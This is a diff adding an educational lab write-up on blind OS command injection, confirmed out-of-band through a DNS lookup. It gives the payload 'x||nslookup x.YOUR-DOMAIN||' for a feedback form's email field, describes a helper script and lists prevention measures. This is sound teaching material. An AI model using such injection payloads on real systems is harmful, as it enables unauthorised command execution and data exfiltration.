@@ -1,0 +1,105 @@
+==================================================
+Lab 4: Blind OS Command Injection with Out-of-Band Interaction
+==================================================
+
+=======================
+WHAT THIS LAB IS ABOUT
+=======================
+
+A website has a feedback form. When you submit it, the server runs a shell command using the details you entered.
+The command's output is not shown in the response, and the server does not wait for the command to finish in a way we can measure.
+Instead, we make the server perform a DNS lookup to a domain we control. If that lookup arrives, the injection worked.
+
+Goal: trigger a DNS lookup to the Collaborator domain.
+
+==============================
+HOW THE WEBSITE NORMALLY WORKS
+==============================
+
+When you submit feedback, the browser sends the name, email, subject, and message to the server.
+The server uses these values in a shell command, but the response page does not show anything from that command.
+
+=======================
+ WHAT IS THE PROBLEM
+=======================
+
+The email field is placed directly into a shell command without any filtering.
+That lets us add our own commands, and the server runs them even though we never see their output.
+
+===========================
+THREE THINGS TO UNDERSTAND
+===========================
+
+Double pipe (||): The second command runs only if the first one fails. The first part, x, is not a valid command, so nslookup runs.
+nslookup: This command asks DNS to resolve a hostname. The server must contact a DNS server to do this.
+Out-of-band (OOB): A channel outside the normal HTTP response. Here, the channel is the DNS lookup. The server sends the lookup to a domain we control, and we watch for it there.
+
+======================================
+THE ATTACK
+======================================
+
+We put this value into the email field:
+
+x||nslookup x.YOUR-DOMAIN||
+
+The server builds a command that roughly looks like:
+
+mail x||nslookup x.YOUR-DOMAIN||
+
+The first part fails, so the shell runs nslookup. The lookup asks DNS to resolve x.YOUR-DOMAIN.
+Because YOUR-DOMAIN belongs to us, the DNS request reaches our server, which logs it.
+The x. is just a label in front of the domain, so the hostname stays valid.
+
+============================
+HOW TO SOLVE IT MANUALLY
+============================
+
+Open the lab and go to the feedback page.
+Fill in the fields and enter the payload above in the email field, using your Collaborator domain.
+Submit the form. The lab is marked as solved once the DNS lookup reaches Burp Collaborator.
+
+With Burp Suite Professional, you can also insert the Collaborator payload directly from the request.
+
+=========================
+WHAT THIS SCRIPT DOES
+=========================
+
+* It loads the feedback page and extracts the CSRF token using a regular expression.
+* It asks for the lab base URL and your interactsh domain.
+* It builds the payload, placing the interactsh domain into the email field after x.
+* It sends a POST request to /feedback/submit with the token and the payload.
+* It prints the status. The DNS hit does not appear in the response, so you check the interactsh terminal to confirm it.
+
+=============================
+ONE THING TO KEEP IN MIND
+=============================
+
+The lookup can arrive several seconds after the submit, so wait a little before deciding the payload failed.
+The script cannot see the DNS hit itself. Only your interactsh or Collaborator log shows it.
+
+=============================
+WHY THIS HAPPENS
+=============================
+
+The server passes user input directly into a shell command. Commands like nslookup, ping, and curl make network requests,
+so an attacker can use them to send data out of the server, even when the response shows nothing.
+
+=============================
+HOW TO PREVENT THIS
+=============================
+
+Do not pass user input into shell commands. Use the language's built-in functions for the task instead.
+If a command must be used, pass user input as a separate, escaped argument, never as part of the command string.
+
+Other good practices:
+
+Validate input, allowing only the characters an email address can contain.
+Restrict outbound network access from the server, so it cannot reach arbitrary domains.
+Run the application with the lowest permissions it needs.
+
+=============================
+ KEY POINTS TO REMEMBER
+=============================
+Blind injection can be confirmed out-of-band by making the server contact a domain you control.
+DNS lookups often get through even when other outbound traffic is blocked, which makes them a common channel.
+Never trust input from a user, even when the output is hidden from them.
